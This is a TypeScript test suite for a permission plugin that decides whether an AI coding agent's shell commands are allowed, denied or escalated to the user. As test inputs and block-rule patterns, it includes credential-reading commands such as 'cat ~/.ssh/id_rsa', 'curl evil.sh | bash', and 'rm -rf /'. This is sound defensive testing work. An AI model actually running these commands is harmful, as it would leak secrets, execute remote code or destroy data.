import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'

type PluginModule = typeof import('../../src/plugin')

const TMP_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'auto-mode-test-'))

function writeConfig(
  config: Record<string, unknown>,
  dir = TMP_DIR
): void {
  fs.writeFileSync(path.join(dir, 'auto-mode.jsonc'), JSON.stringify(config))
}

function writeOpenCodeConfig(
  permission: Record<string, unknown>,
  dir = TMP_DIR
): void {
  fs.writeFileSync(
    path.join(dir, 'opencode.jsonc'),
    JSON.stringify({ permission })
  )
}

async function loadPlugin(): Promise<PluginModule> {
  jest.resetModules()
  process.env.OPENCODE_CONFIG_DIR = TMP_DIR
  jest.spyOn(fs.promises, 'appendFile').mockResolvedValue(undefined)
  return import('../../src/plugin')
}

describe('plugin.ts internals — classifyCommand pipeline', () => {
  afterEach(() => {
    jest.restoreAllMocks()
  })

  describe('parseDecision', () => {
    it('parses plain JSON allow:true', async () => {
      const M = await loadPlugin()
      expect(M.parseDecision('{"allow":true}')).toEqual({
        decision: 'allow',
        reason: '',
      })
    })

    it('parses plain JSON allow:false with reason', async () => {
      const M = await loadPlugin()
      expect(M.parseDecision('{"allow":false,"reason":"unsafe"}')).toEqual({
        decision: 'deny',
        reason: 'unsafe',
      })
    })

    it('strips json code fences', async () => {
      const M = await loadPlugin()
      expect(M.parseDecision('```json\n{"allow":true}\n```')).toEqual({
        decision: 'allow',
        reason: '',
      })
    })

    it('strips bare code fences', async () => {
      const M = await loadPlugin()
      expect(M.parseDecision('```\n{"allow":false}\n```')).toEqual({
        decision: 'deny',
        reason: '',
      })
    })

    it('falls back to ask on partial JSON', async () => {
      const M = await loadPlugin()
      expect(M.parseDecision('{ "allow": true')).toEqual({
        decision: 'ask',
        reason: 'Unparseable LLM response',
      })
    })

    it('falls back to ask on empty string', async () => {
      const M = await loadPlugin()
      expect(M.parseDecision('')).toEqual({
        decision: 'ask',
        reason: 'Unparseable LLM response',
      })
    })

    it('ignores extra fields and truncates long reasons', async () => {
      const M = await loadPlugin()
      const res = M.parseDecision(
        JSON.stringify({ allow: true, extra: 1, reason: 'x'.repeat(500) })
      )
      expect(res.decision).toBe('allow')
      expect(res.reason.length).toBe(200)
    })
  })

  describe('redact / logCmd', () => {
    it('redacts key=value assignments', async () => {
      const M = await loadPlugin()
      const out = M.redact('export API_KEY=abc123 && echo hi')
      expect(out).toContain('API_KEY=***REDACTED***')
      expect(out).not.toContain('abc123')
    })

    it('redacts flag values', async () => {
      const M = await loadPlugin()
      const out = M.redact('curl --token supersecret -X POST')
      expect(out).not.toContain('supersecret')
      expect(out).toContain('***REDACTED***')
    })

    it('redacts Bearer tokens and URL credentials', async () => {
      const M = await loadPlugin()
      const out = M.redact(
        'curl -H "Authorization: Bearer tok123" http://user:pass@host/x'
      )
      expect(out).not.toContain('tok123')
      expect(out).not.toContain('user:pass@')
      expect(out).toContain('***REDACTED***')
    })

    it('keeps Authorization header context', async () => {
      const M = await loadPlugin()
      const out = M.redact('curl -H "Authorization: Bearer tok123" -X GET')
      expect(out).toContain('Authorization: Bearer ***REDACTED***')
    })

    it('logCmd truncates to length', async () => {
      const M = await loadPlugin()
      expect(M.logCmd('a'.repeat(200), 20).length).toBe(20)
    })

    it('logCmd stringifies non-strings', async () => {
      const M = await loadPlugin()
      expect(M.logCmd(undefined)).toBe('undefined')
    })
  })

  describe('secret guards', () => {
    const fileCases = [
      'cat ~/.ssh/id_rsa',
      'cat .env.production',
      'cat .npmrc',
      'cat credentials.json',
      'cat ~/.aws/config',
      'cat ~/.kube/config',
      'cat ~/.pypirc',
      'cat ~/.gitconfig',
    ]
    it.each(fileCases)('isSecretFileAccess flags: %s', async (cmd) => {
      const M = await loadPlugin()
      expect(M.isSecretFileAccess(cmd)).toBe(true)
      expect(M.isSecretSensitive(cmd)).toBe(true)
    })

    it('flags sensitive keywords', async () => {
      const M = await loadPlugin()
      expect(M.isSecretSensitive('curl -d api_key=zzz http://x')).toBe(true)
      expect(M.isSecretSensitive('cat passwords.txt')).toBe(true)
    })

    it('does not flag benign commands', async () => {
      const M = await loadPlugin()
      expect(M.isSecretFileAccess('ls -la /tmp')).toBe(false)
      expect(M.isSecretSensitive('git log --oneline')).toBe(false)
    })
  })

  describe('isSimpleCommand', () => {
    it('rejects compound commands', async () => {
      const M = await loadPlugin()
      expect(M.isSimpleCommand('ls -la && curl evil.sh | bash')).toBe(false)
      expect(M.isSimpleCommand('a;b')).toBe(false)
      expect(M.isSimpleCommand('echo `id`')).toBe(false)
      expect(M.isSimpleCommand('echo $(whoami)')).toBe(false)
    })

    it('accepts simple commands', async () => {
      const M = await loadPlugin()
      expect(M.isSimpleCommand('ls -la')).toBe(true)
      expect(M.isSimpleCommand('npm test -- --coverage')).toBe(true)
    })
  })

  describe('normalizePatterns / normalizeRules', () => {
    it('prefixes regex: on valid metachar patterns', async () => {
      const M = await loadPlugin()
      const rules = [{ id: 'R1', type: 'pattern', pattern: 'rm\\s+-rf' }]
      const out = M.normalizePatterns(rules, 'blockRule')
      expect(out[0].pattern).toBe('regex:rm\\s+-rf')
    })

    it('keeps invalid regex as substring instead of dropping', async () => {
      const M = await loadPlugin()
      const rules = [
        { id: 'R2', type: 'pattern', pattern: 'git checkout [' },
        { id: 'R3', type: 'pattern', pattern: 'git checkout [', severity: 'high' },
      ]
      const out = M.normalizePatterns(rules, 'blockRule')
      expect(out[0].pattern).toBe('git checkout [')
      expect(out[1].severity).toBe('high')
    })

    it('unwraps regex: prefix when the body is invalid', async () => {
      const M = await loadPlugin()
      const rules = [{ id: 'R5', type: 'pattern', pattern: 'regex:[' }]
      const out = M.normalizePatterns(rules, 'blockRule')
      expect(out[0].pattern).toBe('[')
    })

    it('keeps valid regex: patterns untouched', async () => {
      const M = await loadPlugin()
      const rules = [{ id: 'R4', type: 'pattern', pattern: 'regex:^ls$' }]
      const out = M.normalizePatterns(rules, 'blockRule')
      expect(out[0].pattern).toBe('regex:^ls$')
    })

    it('applies softRules by id', async () => {
      const M = await loadPlugin()
      const rules = [
        { id: 'BR-001', type: 'pattern', pattern: 'python -c' },
        { id: 'BR-002', type: 'pattern', pattern: 'rm -rf' },
      ]
      const out = M.normalizeRules(rules, ['BR-001'])
      expect(out[0].severity).toBe('soft')
      expect(out[1].severity).toBeUndefined()
    })

    it('handles null/undefined input', async () => {
      const M = await loadPlugin()
      expect(M.normalizePatterns(undefined, 'blockRule')).toEqual([])
      expect(M.normalizeRules(null, [])).toEqual([])
    })
  })

  describe('classifyCommand', () => {
    const BASE_CONFIG = {
      llm: {
        enabled: true,
        provider: 'openai',
        baseUrl: 'http://localhost:9999/v1',
        model: 'test-model',
        fallbackModel: '',
        timeout: 1000,
      },
      blockRules: [
        {
          id: 'BR-CRITICAL',
          type: 'pattern',
          pattern: 'regex:purge-data',
          severity: 'critical',
          description: 'test',
          enabled: true,
        },
      ],
      allowExceptions: [],
      fallback: { onTimeout: 'ask-user', onError: 'deny' },
      trustBoundary: { protectedPaths: [], protectedCommands: [] },
    }

    function mockLLMResponse(text: string): void {
      jest.spyOn(global, 'fetch').mockResolvedValue({
        ok: true,
        status: 200,
        statusText: 'OK',
        json: () =>
          Promise.resolve({ choices: [{ message: { content: text } }] }),
      } as any)
    }

    function mockLLMError(message: string): void {
      jest.spyOn(global, 'fetch').mockRejectedValue(new Error(message))
    }

    it('denies critical block rules without LLM', async () => {
      writeConfig(BASE_CONFIG)
      const M = await loadPlugin()
      await M.opencodeAutoMode({})
      const res = await M.classifyCommand('purge-data --all', 's1')
      expect(res.decision).toBe('deny')
      expect(res.reason).toContain('BR-CRITICAL')
    })

    it('denies trust-boundary violations', async () => {
      writeConfig({
        ...BASE_CONFIG,
        trustBoundary: { protectedPaths: ['/etc'], protectedCommands: [] },
      })
      const M = await loadPlugin()
      await M.opencodeAutoMode({})
      const res = await M.classifyCommand('cat /etc/hosts', 's1')
      expect(res.decision).toBe('deny')
      expect(res.reason).toContain('TB-')
    })

    it('asks on secret-sensitive commands without LLM', async () => {
      writeConfig(BASE_CONFIG)
      const M = await loadPlugin()
      await M.opencodeAutoMode({})
      const res = await M.classifyCommand('cat .env.production', 's1')
      expect(res.decision).toBe('ask')
      expect(res.reason).toContain('Secret')
    })

    it('asks on secret file access even when no rules match', async () => {
      writeConfig(BASE_CONFIG)
      const M = await loadPlugin()
      await M.opencodeAutoMode({})
      const res = await M.classifyCommand('cat ~/.aws/config', 's1')
      expect(res.decision).toBe('ask')
      expect(res.reason).toContain('Secret')
    })

    it('allow-lists a simple command before rule evaluation', async () => {
      writeConfig(BASE_CONFIG)
      writeOpenCodeConfig({ Bash: { 'ls *': 'allow' } })
      const M = await loadPlugin()
      await M.opencodeAutoMode({})
      const res = await M.classifyCommand('ls -la /tmp', 's1')
      expect(res.decision).toBe('allow')
      expect(res.reason).toContain('allow-list')
    })

    it('does not allow-list compound commands — default rules still apply', async () => {
      writeConfig(BASE_CONFIG)
      writeOpenCodeConfig({ Bash: { 'ls *': 'allow' } })
      const M = await loadPlugin()
      await M.opencodeAutoMode({})
      const res = await M.classifyCommand(
        'ls -la && sudo rm -rf /tmp/evil',
        's1'
      )
      expect(res.decision).toBe('deny')
      expect(res.reason).toContain('BR-001')
      expect(res.reason).not.toContain('allow-list')
    })

    it('maps LLM allow to allow', async () => {
      writeConfig(BASE_CONFIG)
      mockLLMResponse('{"allow":true,"reason":"ok"}')
      const M = await loadPlugin()
      await M.opencodeAutoMode({})
      const res = await M.classifyCommand('git status', 's1')
      expect(res.decision).toBe('allow')
    })

    it('maps LLM deny to deny', async () => {
      writeConfig(BASE_CONFIG)
      mockLLMResponse('{"allow":false,"reason":"dangerous"}')
      const M = await loadPlugin()
      await M.opencodeAutoMode({})
      const res = await M.classifyCommand('git status', 's1')
      expect(res.decision).toBe('deny')
    })

    it('asks with unparseable LLM response', async () => {
      writeConfig(BASE_CONFIG)
      mockLLMResponse('not json at all')
      const M = await loadPlugin()
      await M.opencodeAutoMode({})
      const res = await M.classifyCommand('git status', 's1')
      expect(res.decision).toBe('ask')
      expect(res.reason).toContain('Unparseable')
    })

    it('honors fallback.onTimeout on timeout errors', async () => {
      writeConfig(BASE_CONFIG)
      mockLLMError('Request timed out after 1000ms')
      const M = await loadPlugin()
      await M.opencodeAutoMode({})
      const res = await M.classifyCommand('git status', 's1')
      expect(res.decision).toBe('ask')
      expect(res.reason).toContain('timeout')
    })

    it('honors fallback.onError deny as real deny', async () => {
      writeConfig(BASE_CONFIG)
      mockLLMError('ECONNREFUSED')
      const M = await loadPlugin()
      await M.opencodeAutoMode({})
      const res = await M.classifyCommand('git status', 's1')
      expect(res.decision).toBe('deny')
      expect(res.reason).toContain('fallback deny')
    })

    it('honors fallback.onError allow', async () => {
      writeConfig({ ...BASE_CONFIG, fallback: { onError: 'allow' } })
      mockLLMError('ECONNREFUSED')
      const M = await loadPlugin()
      await M.opencodeAutoMode({})
      const res = await M.classifyCommand('git status', 's1')
      expect(res.decision).toBe('allow')
      expect(res.reason).toContain('fallback allow')
    })

    it('asks when no fallback configured', async () => {
      writeConfig({ ...BASE_CONFIG, fallback: {} })
      mockLLMError('ECONNREFUSED')
      const M = await loadPlugin()
      await M.opencodeAutoMode({})
      const res = await M.classifyCommand('git status', 's1')
      expect(res.decision).toBe('ask')
    })

    it('asks when LLM is disabled', async () => {
      writeConfig({
        ...BASE_CONFIG,
        llm: { ...BASE_CONFIG.llm, enabled: false },
      })
      const M = await loadPlugin()
      await M.opencodeAutoMode({})
      const res = await M.classifyCommand('git status', 's1')
      expect(res.decision).toBe('ask')
      expect(res.reason).toContain('disabled')
    })

    it('asks for high-severity rule matches', async () => {
      writeConfig({
        ...BASE_CONFIG,
        blockRules: [
          ...BASE_CONFIG.blockRules,
          {
            id: 'BR-HIGH',
            type: 'pattern',
            pattern: 'regex:flake-deploy',
            severity: 'high',
            description: 'test',
            enabled: true,
          },
        ],
      })
      const M = await loadPlugin()
      await M.opencodeAutoMode({})
      const res = await M.classifyCommand('flake-deploy --env prod', 's1')
      expect(res.decision).toBe('ask')
      expect(res.reason).toContain('BR-HIGH')
    })

    it('allows by explicit exception without LLM', async () => {
      writeConfig({
        ...BASE_CONFIG,
        allowExceptions: [
          {
            id: 'AE-1',
            type: 'pattern',
            pattern: 'regex:patch-apply',
            enabled: true,
            description: 'test',
          },
        ],
      })
      const M = await loadPlugin()
      await M.opencodeAutoMode({})
      const res = await M.classifyCommand('patch-apply --force', 's1')
      expect(res.decision).toBe('allow')
      expect(res.reason).toContain('Allowed by exception')
    })

    it('asks when LLM model is not configured', async () => {
      writeConfig({
        ...BASE_CONFIG,
        llm: { ...BASE_CONFIG.llm, model: '' },
      })
      const M = await loadPlugin()
      await M.opencodeAutoMode({})
      const res = await M.classifyCommand('git status', 's1')
      expect(res.decision).toBe('ask')
      expect(res.reason).toContain('LLM model not configured')
    })

    it('retries with fallbackModel before honoring fallback', async () => {
      writeConfig({
        ...BASE_CONFIG,
        llm: { ...BASE_CONFIG.llm, fallbackModel: 'fb-model' },
      })
      mockLLMError('ECONNREFUSED')
      const M = await loadPlugin()
      await M.opencodeAutoMode({})
      const res = await M.classifyCommand('git status', 's1')
      expect(res.decision).toBe('deny')
      expect(res.reason).toContain('fallback deny')
    })
  })

  describe('plugin hooks', () => {
    const BASE_CONFIG = {
      llm: {
        enabled: true,
        provider: 'openai',
        baseUrl: 'http://localhost:9999/v1',
        model: 'test-model',
        fallbackModel: '',
        timeout: 1000,
      },
      blockRules: [
        {
          id: 'BR-CRITICAL',
          type: 'pattern',
          pattern: 'regex:purge-data',
          severity: 'critical',
          description: 'test',
          enabled: true,
        },
      ],
      allowExceptions: [],
      fallback: { onTimeout: 'ask-user', onError: 'deny' },
      trustBoundary: { protectedPaths: [], protectedCommands: [] },
    }

    function mockLLMResponse(text: string): void {
      jest.spyOn(global, 'fetch').mockResolvedValue({
        ok: true,
        status: 200,
        statusText: 'OK',
        json: () =>
          Promise.resolve({ choices: [{ message: { content: text } }] }),
      } as any)
    }

    it('tool.execute.before records denial and decision', async () => {
      writeConfig(BASE_CONFIG)
      const M = await loadPlugin()
      const hooks: any = await M.opencodeAutoMode({})
      const input = { tool: 'bash', callID: 'c1', sessionID: 's1' }
      const output = { args: { command: 'purge-data --all' } }
      await hooks['tool.execute.before'](input, output)
      expect(M.getDenialState('s1').total).toBe(1)
    })

    it('tool.execute.before records approval for LLM-allowed commands', async () => {
      writeConfig(BASE_CONFIG)
      mockLLMResponse('{"allow":true}')
      const M = await loadPlugin()
      const hooks: any = await M.opencodeAutoMode({})
      const input = { tool: 'bash', callID: 'c2', sessionID: 's2' }
      const output = { args: { command: 'git status' } }
      await hooks['tool.execute.before'](input, output)
      expect(M.getDenialState('s2')).toEqual({ consecutive: 0, total: 0 })
    })

    it('tool.execute.before ignores non-bash, empty and pre-blocked commands', async () => {
      writeConfig(BASE_CONFIG)
      const M = await loadPlugin()
      const hooks: any = await M.opencodeAutoMode({})
      await hooks['tool.execute.before'](
        { tool: 'read', callID: 'c3', sessionID: 's3' },
        { args: { command: 'rm -rf /' } }
      )
      await hooks['tool.execute.before'](
        { tool: 'bash', callID: 'c4', sessionID: 's4' },
        { args: {} }
      )
      await hooks['tool.execute.before'](
        { tool: 'bash', callID: 'c5', sessionID: 's5' },
        { args: { command: '# BLOCKED rm -rf /' } }
      )
      expect(M.getDenialState('s3')).toEqual({ consecutive: 0, total: 0 })
      expect(M.getDenialState('s4')).toEqual({ consecutive: 0, total: 0 })
      expect(M.getDenialState('s5')).toEqual({ consecutive: 0, total: 0 })
    })

    it('event permission.asked replies once on allow', async () => {
      writeConfig(BASE_CONFIG)
      mockLLMResponse('{"allow":true}')
      const replies: string[] = []
      const client = {
        postSessionIdPermissionsPermissionId: async ({ body }: any) => {
          replies.push(body.response)
        },
      }
      const M = await loadPlugin()
      const hooks: any = await M.opencodeAutoMode({ client } as any)
      await hooks.event({
        event: {
          type: 'permission.asked',
          properties: {
            sessionID: 's1',
            id: 'p1',
            metadata: { command: 'git status' },
            tool: { callID: 'c1' },
          },
        },
      })
      expect(replies).toEqual(['once'])
    })

    it('event permission.asked replies reject on deny', async () => {
      writeConfig(BASE_CONFIG)
      const replies: string[] = []
      const client = {
        postSessionIdPermissionsPermissionId: async ({ body }: any) => {
          replies.push(body.response)
        },
      }
      const M = await loadPlugin()
      const hooks: any = await M.opencodeAutoMode({ client } as any)
      await hooks.event({
        event: {
          type: 'permission.asked',
          properties: {
            sessionID: 's2',
            id: 'p2',
            metadata: { command: 'purge-data --all' },
          },
        },
      })
      expect(replies).toEqual(['reject'])
    })

    it('event permission.asked does not reply on ask or escalation', async () => {
      writeConfig(BASE_CONFIG)
      const replies: string[] = []
      const client = {
        postSessionIdPermissionsPermissionId: async ({ body }: any) => {
          replies.push(body.response)
        },
      }
      const M = await loadPlugin()
      const hooks: any = await M.opencodeAutoMode({ client } as any)
      M.recordDenied('s3')
      M.recordDenied('s3')
      M.recordDenied('s3')
      await hooks.event({
        event: {
          type: 'permission.asked',
          properties: {
            sessionID: 's3',
            id: 'p3',
            metadata: { command: 'purge-data --all' },
          },
        },
      })
      expect(replies).toEqual([])
    })

    it('event session.created and session.deleted manage state', async () => {
      writeConfig(BASE_CONFIG)
      const M = await loadPlugin()
      const hooks: any = await M.opencodeAutoMode({})
      await hooks.event({
        event: {
          type: 'session.created',
          properties: { info: { id: 'sess-1', agent: 'general' } },
        },
      })
      await hooks.event({
        event: {
          type: 'session.deleted',
          properties: { info: { id: 'sess-1' } },
        },
      })
      await hooks.event({ event: {} })
      await hooks.event({})
      expect(M.getDenialState('sess-1')).toEqual({ consecutive: 0, total: 0 })
    })

    it('event permission.asked reuses stored decision by callID', async () => {
      writeConfig(BASE_CONFIG)
      const replies: string[] = []
      const client = {
        postSessionIdPermissionsPermissionId: async ({ body }: any) => {
          replies.push(body.response)
        },
      }
      const M = await loadPlugin()
      const hooks: any = await M.opencodeAutoMode({ client } as any)
      await hooks['tool.execute.before'](
        { tool: 'bash', callID: 'c9', sessionID: 's9' },
        { args: { command: 'purge-data --all' } }
      )
      await hooks.event({
        event: {
          type: 'permission.asked',
          properties: {
            sessionID: 's9',
            id: 'p9',
            metadata: { command: 'purge-data --all' },
            tool: { callID: 'c9' },
          },
        },
      })
      expect(replies).toEqual(['reject'])
    })
  })

  describe('per-session escalation counters', () => {
    it('tracks denials per session without cross-contamination', async () => {
      const M = await loadPlugin()
      M.recordDenied('s1')
      M.recordDenied('s1')
      M.recordDenied('s2')
      expect(M.getDenialState('s1')).toEqual({ consecutive: 2, total: 2 })
      expect(M.getDenialState('s2')).toEqual({ consecutive: 1, total: 1 })
    })

    it('resets consecutive but preserves total across approvals', async () => {
      const M = await loadPlugin()
      M.recordDenied('s1')
      M.recordDenied('s1')
      M.recordApproved('s1')
      const state = M.getDenialState('s1')
      expect(state.consecutive).toBe(0)
      expect(state.total).toBe(2)
    })
  })
})